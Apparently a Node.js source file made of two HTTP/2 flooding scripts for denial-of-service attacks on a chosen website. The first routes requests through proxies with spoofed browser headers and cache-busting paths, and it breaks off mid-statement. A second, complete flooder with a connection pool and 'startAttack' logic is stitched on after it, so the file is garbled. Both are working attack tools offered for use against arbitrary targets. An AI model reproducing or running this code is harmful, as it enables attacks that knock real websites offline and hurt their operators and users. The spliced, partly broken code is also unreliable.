const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const UserAgent = require('user-agents');

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 6) {
    console.log(`Usage: node script.js <target> <time> <rate> <thread>`);
    process.exit();
}

function readLines(filePath) {
    try {
        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
    } catch (e) {
        console.error(`Error reading file ${filePath}. Make sure it exists and is not empty.`);
        process.exit();
    }
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: "proxy.txt"
}

const sig = [
    'ecdsa_secp256r1_sha256', 'ecdsa_secp384r1_sha384', 'ecdsa_secp521r1_sha512',
    'rsa_pkcs1_sha256', 'rsa_pkcs1_sha384', 'rsa_pkcs1_sha512',
];
const cplist = [
    "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
    "TLS_AES_128_GCM_SHA256", "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"
];
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/xml;q=0.9,image/avif,image/webp,apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'application/json,text/plain,*/*'
];
const lang_header = [
    'en-US,en;q=0.9', 'en-GB,en;q=0.8', 'es-ES,es;q=0.7', 'de-DE,de;q=0.6',
    'fr-FR,fr;q=0.9', 'ja-JP,ja;q=0.8', 'ko-KR,ko;q=0.7', 'zh-CN,zh;q=0.6',
    'ru-RU,ru;q=0.9', 'pt-BR,pt;q=0.8', 'it-IT,it;q=0.7', 'ar-SA,ar;q=0.6'
];
const encoding_header = ['gzip, deflate, br', 'gzip, deflate', 'br', 'deflate', 'gzip', '*'];
const control_header = ['no-cache', 'max-age=0', 'no-store', 'must-revalidate', 'proxy-revalidate'];
const dest_header = ['document', 'empty', 'script', 'image', 'style', 'report', 'font'];
const site_header = ['same-origin', 'same-site', 'cross-site', 'none'];

const proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.clear();
    console.log('\x1b[1m\x1b[34m' + '>> Target: ' + '\x1b[0m\x1b[1m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[33m' + '>> Duration: ' + '\x1b[0m\x1b[1m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[32m' + '>> Threads: ' + '\x1b[0m\x1b[1m' + args.threads + '\x1b[0m');
    console.log('\x1b[1m\x1b[31m' + '>> Rate: ' + '\x1b[0m\x1b[1m' + args.Rate + '\x1b[0m');
    console.log('\x1b[1m\x1b[35m' + '>> Proxy File: ' + '\x1b[0m\x1b[1m' + args.proxyFile + '\x1b[0m');
} else {
    setInterval(runFlooder);
}

class NetSocket {
    constructor() {}
    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true,
        });
        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 10000);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const isAlive = chunk.toString("utf-8").includes("HTTP/1.1 200");
            if (!isAlive) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function generateRandomPath() {
    const random_param_key = randstr(randomIntn(5, 10));
    const random_param_value = randstr(randomIntn(7, 15));
    return `${parsedTarget.path.endsWith('/') ? parsedTarget.path : parsedTarget.path + '/'}?${random_param_key}=${random_param_value}&_=${Date.now()}`;
}

const Socker = new NetSocket();

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 15,
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2', 'http/1.1'],
            sigals: randomElement(sig),
const http2 = require('http2');
const tls = require('tls');
const crypto = require('crypto');
const url = require('url');
const UserAgent = require('user-agents');

// Command-line arguments parsing
const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]) || 260,
    Rate: parseInt(process.argv[4]) || 1000,
    threads: parseInt(process.argv[5]) || 10
};

// Header arrays for randomization
const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
];

const lang_header = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.9',
    'es-ES,es;q=0.8',
    'it-IT,it;q=0.7',
    'ja-JP,ja;q=0.9'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    'gzip',
    'deflate'
];

const control_header = [
    'no-cache',
    'max-age=0',
    'no-store',
    'must-revalidate',
    'private'
];

const dest_header = [
    'document',
    'image',
    'style',
    'script',
    'font'
];

const site_header = [
    'same-origin',
    'cross-site',
    'same-site',
    'none'
];

const cplist = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256',
    'TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384',
    'TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384'
];

// Utility functions
function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function generateRandomPath() {
    const paths = [
        '/', '/home', '/about', '/contact', '/products', '/services',
        '/blog', '/news', '/shop', '/cart', '/profile', '/search'
    ];
    const randomPath = randomElement(paths);
    return randomPath + generateQueryParams();
}

function generateQueryParams() {
    const params = [
        'q', 's', 'search', 'id', 'page', 'category', 'sort', 'filter',
        'lang', 'region', 'type', 'query', 'token', 'session'
    ];
    const count = Math.floor(Math.random() * 5) + 1;
    let query = '?';
    for (let i = 0; i < count; i++) {
        const key = randomElement(params);
        const value = crypto.randomBytes(8).toString('hex');
        query += `${key}=${value}${i < count - 1 ? '&' : ''}`;
    }
    return query;
}

function generateRandomString(length) {
    return crypto.randomBytes(length).toString('hex').slice(0, length);
}

// Validate target URL
const parsedTarget = url.parse(args.target);
if (!parsedTarget.host) {
    console.error('Invalid target URL');
    process.exit(1);
}

// TLS options
const tlsOptions = {
    socket: null,
    ciphers: randomElement(cplist),
    ecdhCurve: 'auto',
    host: parsedTarget.host,
    servername: parsedTarget.host,
    rejectUnauthorized: false,
    secureOptions: crypto.constants.SSL_OP_NO_TICKET | 
                  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION,
    ALPNProtocols: ['h2', 'http/1.1']
};

// Connection pool management
class ConnectionPool {
    constructor(size) {
        this.pool = new Array(size).fill(null);
        this.activeConnections = 0;
        this.maxConnections = size;
    }

    createConnection() {
        if (this.activeConnections >= this.maxConnections) return null;

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.on('error', () => {
            tlsConn.destroy();
            this.activeConnections--;
        });

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 20000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            }
        });

        this.activeConnections++;
        return client;
    }

    destroyConnection(client) {
        if (client) {
            client.destroy();
            this.activeConnections--;
        }
    }
}

// Request generator
class RequestGenerator {
    constructor(client) {
        this.client = client;
    }

    generateHeaders() {
        const userAgent = new UserAgent();
        return {
            ':method': 'GET',
            ':authority': parsedTarget.host,
            ':scheme': 'https',
            ':path': generateRandomPath(),
            'user-agent': userAgent.toString(),
            'accept': randomElement(accept_header),
            'accept-language': randomElement(lang_header),
            'accept-encoding': randomElement(encoding_header),
            'cache-control': randomElement(control_header),
            'upgrade-insecure-requests': '1',
            'sec-fetch-dest': randomElement(dest_header),
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': randomElement(site_header),
            'sec-fetch-user': '?1',
            'sec-ch-ua': `"${userAgent.brand}";v="${userAgent.version.split('.')[0]}", "Chromium";v="${userAgent.version.split('.')[0]}", "Not A(Brand";v="99"`,
            'sec-ch-ua-mobile': userAgent.mobile ? '?1' : '?0',
            'sec-ch-ua-platform': `"${userAgent.platform}"`,
            'referer': `https://${parsedTarget.host}${generateRandomPath()}`,
            'x-forwarded-for': generateRandomString(12),
            'x-requested-with': 'XMLHttpRequest',
            'pragma': 'no-cache',
            'priority': 'u=0, i',
            'te': 'trailers',
            'dnt': Math.random() > 0.5 ? '1' : '0',
            'x-correlation-id': crypto.randomUUID()
        };
    }

    sendRequests(rate) {
        for (let i = 0; i < rate; i++) {
            const request = this.client.request(this.generateHeaders());
            request.on('response', () => {});
            request.on('error', () => {});
            request.end();
        }
    }
}

// Main attack function
function startAttack() {
    const pool = new ConnectionPool(args.threads);

    for (let i = 0; i < args.threads; i++) {
        const client = pool.createConnection();
        if (!client) continue;

        client.on('connect', () => {
            const generator = new RequestGenerator(client);
            const interval = setInterval(() => {
                try {
                    generator.sendRequests(args.Rate);
                } catch (err) {
                    console.error('Request error:', err.message);
                }
            }, 1000);

            const onClose = () => {
                clearInterval(interval);
                pool.destroyConnection(client);
            };

            client.on('close', onClose);
            client.on('error', onClose);
        });

        client.on('error', () => {
            pool.destroyConnection(client);
        });
    }
}

// Start the attack
for (let i = 0; i < args.threads; i++) {
    setImmediate(startAttack);
}

// Timeout to end the attack
setTimeout(() => {
    console.log('Attack finished.');
    process.exit(0);
}, args.time * 1000);

// Performance monitoring
let requestCount = 0;
setInterval(() => {
    console.log(`Requests sent: ${requestCount}`);
}, 10000);

process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (err) => {
    console.error('Unhandled Rejection:', err.message);
});
